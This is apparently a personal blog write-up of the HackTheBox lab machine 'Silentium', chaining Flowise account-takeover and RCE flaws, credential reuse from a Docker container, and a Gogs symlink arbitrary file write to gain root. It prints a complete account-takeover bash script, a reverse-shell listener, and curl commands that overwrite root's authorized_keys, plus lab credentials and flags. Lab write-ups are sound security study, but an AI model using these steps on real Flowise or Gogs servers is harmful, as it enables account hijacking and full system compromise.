---
title: "Silentium - HackTheBox Writeup"
date: 2026-05-06
tags: [HTB, Linux, Medium, Flowise, CVE, Account Takeover, RCE, Docker, Gogs, Symlink, SSH]
image: /assets/img/posts/silentium/banner.png

---

# Silentium — HackTheBox Writeup

**Difficulty:** Medium
**OS:** Linux (Ubuntu 24.04)
**Key Concepts:** Flowise Account Takeover (CVE-2025-58434), Flowise RCE (GHSA-3gcm-f6qx-ff7p), Docker Container Escape via Credential Reuse, Gogs Symlink Arbitrary File Write (CVE-2025-8110)

---

## Overview

Silentium is a medium-rated Linux box that chains together two Flowise CVEs and a Gogs symlink bypass to go from zero to root. The attack path starts with vhost enumeration revealing a staging Flowise instance, where a forgot-password endpoint leaks the full user object including a reset token — classic account takeover. From there, a separate Flowise RCE drops us into a Docker container running as root. Environment variables inside the container leak SSH credentials for the host. Once on the box as `ben`, we find Gogs running as root on an internal port, and exploit CVE-2025-8110 — a symlink-based arbitrary file write — to plant our SSH public key into root's `authorized_keys`.

I pwned this box on May 6th, 2026 while it was still active and posted the proof on LinkedIn before it retired. This might be one of the first proper writeups with a dedicated website for this box.

---

## Enumeration

### Nmap

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ nmap 10.129.28.220 -vv -p- -oN nmap/silentium-open-ports

Nmap scan report for 10.129.28.220
Host is up, received reset ttl 63 (0.028s latency).
Scanned at 2026-05-05 02:34:40 EDT for 29s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Only two ports — SSH and HTTP. Minimal attack surface.

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ nmap -sC -sV -p22,80 -A -oN nmap/silentium-detailed-scan 10.129.28.220 -vv

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

The redirect tells us the domain — added `silentium.htb` to `/etc/hosts`.

### Web Enumeration — silentium.htb

The main site is a corporate finance/lending page. Nothing crazy — a loan calculator with a clean frontend.

![Silentium landing page](/assets/img/posts/silentium/silentium-landing.png)

Looking through the page, there are a few people names that could be usernames: **Marcus Thorne**, **Ben**, and **Elena Rossi**.

![Leadership section with names](/assets/img/posts/silentium/silentium-leadership.png)

Source code analysis revealed a simple `app.js` with just navbar scroll behavior and a calculator function — safe code, nothing interesting.

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ gobuster dir -u http://silentium.htb:80/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --output dir_enum-staging_htb.txt --timeout 30s --exclude-length 8753

assets               (Status: 301) [Size: 178] [--> http://silentium.htb/assets/]
```

![Directory enumeration](/assets/img/posts/silentium/silentium-dir-enum.png)

Nothing useful in `/assets/` either. Tried raft-large-dirs too — nada.

![403 on assets](/assets/img/posts/silentium/silentium-assets-403.png)

### VHost Fuzzing

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ gobuster vhost --url http://silentium.htb/ --wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --output vhost-fuzzing-output --append-domain

staging.silentium.htb Status: 200 [Size: 3142]
```

![VHost fuzzing result](/assets/img/posts/silentium/silentium-vhost-fuzz.png)

Now we're talking. Added `staging.silentium.htb` to `/etc/hosts`.

---

## Staging — Flowise Instance

The staging subdomain hosts a different application entirely.

![Flowise login page](/assets/img/posts/silentium/staging-flowise-login.png)

Source code confirms it — `<title>Flowise - Build AI Agents, Visually</title>`.

![Flowise source code](/assets/img/posts/silentium/staging-flowise-source.png)

Fuzzing it:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ gobuster dir -u http://staging.silentium.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --output dir_enum-staging_silentium_htb.txt --timeout 30s --exclude-length 3142

assets               (Status: 301) [Size: 156] [--> /assets/]
```

Burpsuite revealed the frontend talks to an API at `/api/v1/`:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ curl http://staging.silentium.htb/api/v1/
{"error":"Unauthorized Access"}

┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ curl http://staging.silentium.htb/api/v1/settings
{"PLATFORM_TYPE":"open source"}
```

The login method endpoint confirms this is a Flowise instance with OAuth callback support:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ curl http://staging.silentium.htb/api/v1/loginmethod/ | jq .
{
  "providers": [],
  "callbacks": [
    {
      "providerName": "azure",
      "callbackURL": "http://127.0.0.1:3000/api/v1/azure/callback"
    },
    {
      "providerName": "google",
      "callbackURL": "http://127.0.0.1:3000/api/v1/google/callback"
    },
    {
      "providerName": "auth0",
      "callbackURL": "http://127.0.0.1:3000/api/v1/auth0/callback"
    },
    {
      "providerName": "github",
      "callbackURL": "http://127.0.0.1:3000/api/v1/github/callback"
    }
  ]
}
```

Internal port 3000 — confirms it's running behind nginx.

Testing the login endpoint:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ curl -s http://staging.silentium.htb/api/v1/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"email@email.com","password":"password"}'
{"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
```

So it tells us when a user doesn't exist — useful for enumeration.

---

## Flowise Account Takeover — CVE-2025-58434

Looking at Flowise security advisories, [GHSA-wgpv-6j63-x5ph](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph) describes a forgot-password endpoint that leaks the full user object including the password reset token. Exploitation requires only the victim's email address, which is often guessable or discoverable.

![Reset password page](/assets/img/posts/silentium/staging-reset-password.png)

Testing the forgot-password endpoint in Burpsuite with a fake email returns "User Not Found" — confirming user enumeration is possible:

![Burpsuite forgot-password request](/assets/img/posts/silentium/staging-burp-forgot-password.png)

Remember "Ben" from the main site? Let's try `ben@silentium.htb`:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ curl -s http://staging.silentium.htb/api/v1/account/forgot-password \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq .
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "RPCBU9wmi7mMBsrxTTjO3A6s7wC2DU4HcaNcDtEXv2cJREh7T54ISA9zDUw04VUz",
    "tokenExpiry": "2026-05-05T08:21:47.190Z",
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-05-05T08:06:47.000Z"
  }
}
```

The entire user object — including the bcrypt password hash AND the `tempToken` needed to reset the password. The name confirms Ben is the `admin` account.

### Automated Account Takeover Script

Let's automate the full chain — request token, extract it, reset password:

```bash
#!/bin/bash

TARGET="http://staging.silentium.htb"
EMAIL="ben@silentium.htb"
NEW_PASS="password"

echo
echo "  ┌─────────────────────────────────┐"
echo "  │  Flowise Account Takeover       │"
echo "  │  CVE-2025-58434                 │"
echo "  └─────────────────────────────────┘"
echo

# Step 1
printf "[1/3] Requesting reset token... "
RESPONSE=$(curl -s "$TARGET/api/v1/account/forgot-password" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"user\":{\"email\":\"$EMAIL\"}}")
echo "done"

# Step 2
TOKEN=$(echo "$RESPONSE" | jq -r '.token // .tempToken // .resetToken // .user.tempToken' 2>/dev/null)

if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
  echo "[-] Token extraction failed. Raw response:"
  echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
  exit 1
fi

printf "[2/3] Token acquired: "
echo "${TOKEN:0:12}..."

# Step 3
printf "[3/3] Resetting password... "
curl -s "$TARGET/api/v1/account/reset-password" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$TOKEN\",\"password\":\"$NEW_PASS\"}}" > /dev/null
echo "done"

echo
echo "  ✓ Login → $EMAIL : $NEW_PASS"
echo
```

Password reset — we're now `admin` on the Flowise instance.

![ATO script execution](/assets/img/posts/silentium/staging-ato-script.png)

---

## Flowise RCE — GHSA-3gcm-f6qx-ff7p

After logging in and grabbing a JWT token, we're greeted by the Flowise dashboard:

![Flowise dashboard](/assets/img/posts/silentium/staging-flowise-dashboard.png)

Navigating to API Keys reveals an existing key we can use:

![Flowise API Keys](/assets/img/posts/silentium/staging-flowise-apikeys.png)

The next step is [GHSA-3gcm-f6qx-ff7p](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) — a separate Flowise vulnerability that leads to remote code execution. Using the authenticated JWT token, we trigger the RCE:

![RCE proof](/assets/img/posts/silentium/staging-rce-proof.png)

And catch a reverse shell:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.45] from (UNKNOWN) [10.129.29.54] 37445
sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # pwd
/
```

Root... but not on the host. The minimal filesystem, the hostname `c78c3cceb7ba`, and the environment variables confirm this is a **Docker container**.

---

## Container Escape — Credential Reuse

Enumerating the container's environment variables:

```bash
/ # printenv
FLOWISE_PASSWORD=r04D!!_R4ge
HOSTNAME=c78c3cceb7ba
PORT=3000
SENDER_EMAIL=ben@silentium.htb
FLOWISE_USERNAME=ben
SMTP_HOST=mailhog
LLM_PROVIDER=nvidia-nim
DATABASE_PATH=/root/.flowise
SECRETKEY_PATH=/root/.flowise
...
```

`FLOWISE_PASSWORD=r04D!!_R4ge` — and we know the host has SSH open. Let's try Ben's credentials on the host:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/silentium]
└─$ ssh ben@silentium.htb
ben@silentium.htb's password: r04D!!_R4ge

ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
ben@silentium:~$ cat user.txt
4c28ae8ceaf3a331884dda37cf91b1e6
```

User flag. Credential reuse from the container environment to the host — always check `printenv` in Docker containers.

---

## Privilege Escalation — Gogs Symlink RCE (CVE-2025-8110)

### Internal Enumeration

Looking at running processes:

```bash
ben@silentium:~$ ps aux | grep -E "gogs|mail|cron"
root        1520  0.0  1.6 1664680 68108 ?       Ssl  00:25   0:01 /opt/gogs/gogs/gogs web
ben         1940  0.0  0.4 714464 16312 ?        Ssl  00:25   0:00 MailHog
root        1522  0.0  0.0   6824  2856 ?        Ss   00:25   0:00 /usr/sbin/cron -f -P
```

Gogs running as **root** on an internal port. Let's grab the config:

```bash
ben@silentium:/$ cat /opt/gogs/gogs/custom/conf/app.ini
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db

[repository]
ROOT_PATH      = /root/gogs-repositories
ROOT           = /root/gogs-repositories

[security]
INSTALL_LOCK = true
SECRET_KEY   = sdsrcxSm0iC7wDO

[auth]
DISABLE_REGISTRATION        = false
```

Key findings: Gogs on port 3001, running as root, repositories stored in `/root/gogs-repositories`, and **registration is not disabled**. The sqlite database is in `/opt/gogs/data/gogs.db` but we don't have DAC access to it.

### SSH Port Forward

```bash
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb
```

Now we can access Gogs in our browser at `localhost:8080`.

![Gogs landing page](/assets/img/posts/silentium/gogs-landing.png)

### The Exploit — CVE-2025-8110

Looking at Gogs + "running as root" + RCE on Google leads to [CVE-2025-8110](https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp) — documented by [Wiz Research](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit). It's a symlink bypass of a previously patched RCE (CVE-2024-55947) that allows authenticated users to overwrite files outside the repository via the API, leading to arbitrary file write as whatever user Gogs runs as — in our case, **root**.

The plan: create a symlink pointing to `/root/.ssh/authorized_keys`, then overwrite it with our public key via the Gogs API.

Since registration is open, we create an account `slayer` and get an API token:

```bash
ben@silentium:~$ curl -u "slayer:password" -X POST -d "name=token_name" http://127.0.0.1:3001/api/v1/users/slayer/tokens

{"name":"token_name","sha1":"ffbb7d4ed310e3f33727f896669995681022fc4d"}
```

### Step 1 — Create Repo with Symlink

Create a repo `poc2`, add a symlink file pointing to root's `authorized_keys`, and push it:

```bash
ln -s /root/.ssh/authorized_keys link
git add link
git commit -m 'add' && git push
```

### Step 2 — Get the SHA of the Symlink

```bash
ben@silentium:~/poc2$ curl -s http://127.0.0.1:3001/api/v1/repos/slayer/poc2/contents/link \
  -H "Authorization: token ffbb7d4ed310e3f33727f896669995681022fc4d" | python3 -c "import sys,json;print(json.loads(sys.stdin.read())['sha'])"

9c87fc525b63ebd989fa409533d3be1b295d6ec3
```

### Step 3 — Generate SSH Key and Prep Payload

```bash
ben@silentium:~/poc2$ ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
```

Base64 encode the public key and build the JSON payload:

```bash
ben@silentium:~/poc2$ B64=$(base64 -w 0 /tmp/rootkey.pub)

ben@silentium:~/poc2$ echo "{\"message\":\"update\",\"committer\":{\"name\":\"slayer\",\"email\":\"slayer@silentium.htb\"},\"content\":\"${B64}\",\"sha\":\"9c87fc525b63ebd989fa409533d3be1b295d6ec3\"}" > /tmp/payload.json
```

### Step 4 — Overwrite authorized_keys via API

The symlink bypass means the PUT request to update the `link` file actually writes through the symlink to `/root/.ssh/authorized_keys`:

```bash
ben@silentium:~/poc2$ curl -v http://127.0.0.1:3001/api/v1/repos/slayer/poc2/contents/link \
  -X PUT \
  -H "Authorization: token ffbb7d4ed310e3f33727f896669995681022fc4d" \
  -H "Content-Type: application/json" \
  -d @/tmp/payload.json

< HTTP/1.1 201 Created
...
"type":"symlink","target":"/root/.ssh/authorized_keys"
```

The response confirms the symlink target — our public key is now in root's `authorized_keys`. EZ PZ.

### Step 5 — SSH as Root

```bash
ben@silentium:~/poc2$ ssh -i /tmp/rootkey root@127.0.0.1
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

root@silentium:~# id
uid=0(root) gid=0(root) groups=0(root)
root@silentium:~# cat /root/root.txt
371932e0be62a4f046f501723d959a53
```

GGS!!

---

## Attack Chain Summary

```
silentium.htb (port 80)
    │
    ├── VHost fuzzing → staging.silentium.htb
    │       └── Flowise instance (open source, API at /api/v1/)
    │
    ├── CVE-2025-58434 — Forgot Password Token Leak
    │       └── ben@silentium.htb → full user object + tempToken
    │               └── Password reset → admin access to Flowise
    │
    ├── GHSA-3gcm-f6qx-ff7p — Flowise RCE
    │       └── Reverse shell → Docker container (root)
    │               └── printenv → FLOWISE_PASSWORD=r04D!!_R4ge
    │
    ├── Credential Reuse → SSH as ben
    │       └── USER FLAG
    │
    └── Gogs on port 3001 (running as root)
            └── CVE-2025-8110 — Symlink Arbitrary File Write
                    └── Symlink → /root/.ssh/authorized_keys
                            └── Overwrite with own public key
                                    └── SSH as root → ROOT FLAG
```

---

## Key Takeaways

- **VHost fuzzing is non-negotiable** — the main site was a dead end, but the staging subdomain was the entire attack surface. Always fuzz for subdomains/vhosts.
- **Flowise security advisories are a goldmine** — two separate CVEs chained together: a forgot-password token leak for account takeover, and an authenticated RCE. The `PLATFORM_TYPE: open source` from the settings endpoint was enough to fingerprint it.
- **Always enumerate Docker containers** — `printenv` in a container can leak host credentials, database passwords, API keys, and more. The credential reuse from Flowise's environment variables to the host SSH was the container escape.
- **Internal services running as root are high-value targets** — Gogs running as root with open registration on an internal port is a ticking time bomb. CVE-2025-8110's symlink bypass turns an arbitrary file write into instant root by targeting `authorized_keys`.
- **The symlink attack pattern** is elegant — create a symlink in a git repo pointing to a sensitive file, then use the API to "update" the symlink file, which actually writes through to the target. Same class of bug as Git's own CVE-2024-32002.